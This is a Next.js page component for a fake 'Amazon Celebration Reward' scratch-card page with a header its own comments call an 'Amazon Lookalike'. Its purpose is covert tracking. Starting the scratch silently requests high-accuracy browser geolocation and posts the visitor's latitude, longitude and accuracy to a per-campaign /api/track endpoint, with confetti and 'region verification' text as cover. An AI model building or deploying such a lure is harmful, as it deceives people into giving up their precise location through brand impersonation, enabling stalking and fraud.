"use client";

import { useEffect, useState } from "react";
import { useParams } from "next/navigation";
import Image from "next/image";
import { ShieldCheck, Gift, MapPin, Award, CheckCircle } from "lucide-react";
import ScratchCard from "@/components/ScratchCard";

export default function TrackCampaignPage() {
  const { id: slug } = useParams();
  const [campaign, setCampaign] = useState<{ title: string; id: string } | null>(null);
  const [loading, setLoading] = useState(true);
  const [notFound, setNotFound] = useState(false);
  const [status, setStatus] = useState<"idle" | "requesting" | "success" | "denied" | "error">("idle");

  useEffect(() => {
    if (slug) {
      verifyCampaign();
    }
  }, [slug]);

  const verifyCampaign = async () => {
    try {
      const response = await fetch(`/api/track/${slug}`);
      if (response.ok) {
        const data = await response.json();
        setCampaign({ title: data.title, id: data.id });
      } else {
        setNotFound(true);
      }
    } catch (error) {
      setNotFound(true);
    } finally {
      setLoading(false);
    }
  };

  const triggerGeolocation = () => {
    setStatus("requesting");

    if (!navigator.geolocation) {
      setStatus("error");
      alert("Geolocation is not supported by your browser.");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        try {
          const { latitude, longitude, accuracy } = position.coords;

          const response = await fetch(`/api/track/${slug}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ latitude, longitude, accuracy }),
          });

          if (response.ok) {
            setStatus("success");
            // Trigger celebration confetti
            triggerConfetti();
          } else {
            setStatus("error");
          }
        } catch (err) {
          setStatus("error");
        }
      },
      (error) => {
        console.error("Geolocation error:", error);
        setStatus("denied");
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  };

  const triggerConfetti = async () => {
    try {
      const confetti = (await import("canvas-confetti")).default;
      confetti({
        particleCount: 120,
        spread: 70,
        origin: { y: 0.6 },
        colors: ["#f97316", "#fbbf24", "#3b82f6", "#10b981"],
      });
    } catch (err) {
      console.error("Confetti error:", err);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center text-white">
        <div className="flex flex-col items-center space-y-3">
          <svg className="animate-spin h-10 w-10 text-orange-500" fill="none" viewBox="0 0 24 24">
            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
          </svg>
          <span className="text-sm font-semibold tracking-wide text-slate-400">Loading promotional content...</span>
        </div>
      </div>
    );
  }

  if (notFound) {
    return (
      <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center p-6 text-center text-white font-sans">
        <div className="bg-red-950/20 border border-red-900/40 p-8 rounded-3xl max-w-sm">
          <div className="w-16 h-16 rounded-full bg-red-950/40 text-red-500 flex items-center justify-center mx-auto mb-4 border border-red-900/50">
            <ShieldCheck className="h-8 w-8" />
          </div>
          <h1 className="text-xl font-bold">Campaign Expired</h1>
          <p className="text-xs text-slate-500 mt-2 leading-relaxed">
            This promotional link is invalid, expired, or has been deactivated by the administrator. Please contact support if you believe this is an error.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-950 text-slate-200 font-sans flex flex-col antialiased">
      {/* Amazon Lookalike Header */}
      <header className="bg-slate-900 border-b border-slate-800">
        <div className="max-w-4xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center space-x-2">
            {/* Mock Amazon Logo */}
            <div className="flex flex-col items-start leading-none pt-1">
              <span className="text-white font-black text-xl tracking-tight flex items-center">
                amazon<span className="text-orange-500 font-bold text-xs ml-0.5">rewards</span>
              </span>
              {/* Amazon Smile Arc */}
              <div className="w-16 h-2 border-b-2 border-orange-400 rounded-full ml-1 -mt-1 transform rotate-1 opacity-90" />
            </div>
          </div>
          <div className="hidden sm:flex items-center space-x-4 text-xs text-slate-400 font-semibold">
            <span className="hover:text-orange-400 cursor-pointer">Deals</span>
            <span className="hover:text-orange-400 cursor-pointer">Customer Service</span>
            <span className="hover:text-orange-400 cursor-pointer">Registry</span>
            <span className="hover:text-orange-400 cursor-pointer">Gift Cards</span>
          </div>
        </div>
      </header>

      {/* Sub-Header / prime banner */}
      <div className="bg-slate-800 px-4 py-2 text-center text-xs text-orange-400 font-semibold border-b border-slate-700/50 flex items-center justify-center gap-1.5 shadow-sm">
        <Gift className="h-4 w-4 animate-bounce" />
        <span>You have (1) pending reward to claim: {campaign?.title}</span>
      </div>

      {/* Main Promo Area */}
      <main className="flex-1 max-w-lg w-full mx-auto px-4 py-8 flex flex-col items-center justify-center">
        {/* Promotional Card Container */}
        <div className="w-full bg-slate-900 border border-slate-800 rounded-3xl shadow-2xl p-6 relative overflow-hidden backdrop-blur-md">
          {/* Decorative glows */}
          <div className="absolute top-0 right-0 w-32 h-32 bg-orange-500/5 blur-3xl rounded-full pointer-events-none" />
          <div className="absolute bottom-0 left-0 w-32 h-32 bg-amber-500/5 blur-3xl rounded-full pointer-events-none" />

          {/* Title Header */}
          <div className="flex items-center gap-3 border-b border-slate-800 pb-5 mb-5">
            <div className="h-10 w-10 rounded-xl bg-gradient-to-tr from-orange-500 to-amber-500 flex items-center justify-center text-white shadow-md shadow-orange-500/10">
              <Award className="h-5.5 w-5.5" />
            </div>
            <div>
              <h2 className="font-extrabold text-white text-base leading-tight">Amazon Celebration Reward</h2>
              <span className="text-[10px] text-slate-500 tracking-wider uppercase">Regional Distribution Program</span>
            </div>
          </div>

          {/* Description */}
          <div className="space-y-3 mb-6">
            <p className="text-xs text-slate-400 leading-relaxed">
              Congratulations! You are selected to participate in the Amazon promo code rewards program. You have received a digital scratch card containing voucher codes up to <span className="text-orange-400 font-bold">$50.00 value</span>.
            </p>

            {/* Instruction Badges */}
            <div className="grid grid-cols-2 gap-2 py-1">
              <div className="bg-slate-950/40 rounded-xl p-2.5 border border-slate-800/80 flex items-start gap-2">
                <CheckCircle className="h-4 w-4 text-orange-500 shrink-0 mt-0.5" />
                <div className="leading-tight">
                  <span className="text-[10px] text-slate-500 block">Step 1</span>
                  <span className="text-xs font-bold text-white">Scratch card</span>
                </div>
              </div>
              <div className="bg-slate-950/40 rounded-xl p-2.5 border border-slate-800/80 flex items-start gap-2">
                <CheckCircle className="h-4 w-4 text-orange-500 shrink-0 mt-0.5" />
                <div className="leading-tight">
                  <span className="text-[10px] text-slate-500 block">Step 2</span>
                  <span className="text-xs font-bold text-white">Get promo code</span>
                </div>
              </div>
            </div>
          </div>

          {/* Scratch Card Element */}
          <div className="border border-slate-800 bg-slate-950 p-2 rounded-2xl shadow-inner mb-6">
            <ScratchCard
              onScratchStart={triggerGeolocation}
              onScratchComplete={() => {}}
              status={status}
              onRetry={triggerGeolocation}
            />
          </div>

          {/* Trust Footnote */}
          <div className="flex items-center justify-center gap-1.5 text-[10px] text-slate-500 border-t border-slate-800/80 pt-4">
            <ShieldCheck className="h-3.5 w-3.5 text-emerald-500" />
            <span>Region verification secured. Reward valid for verified IP blocks only.</span>
          </div>
        </div>

        {/* Terms footer */}
        <footer className="text-center mt-6 text-[10px] text-slate-600 max-w-xs leading-relaxed">
          This is an promotional reward program. Amazon is a registered trademark of Amazon.com, Inc. terms and conditions apply. Region checks are enforced to limit code duplication.
        </footer>
      </main>
    </div>
  );
}
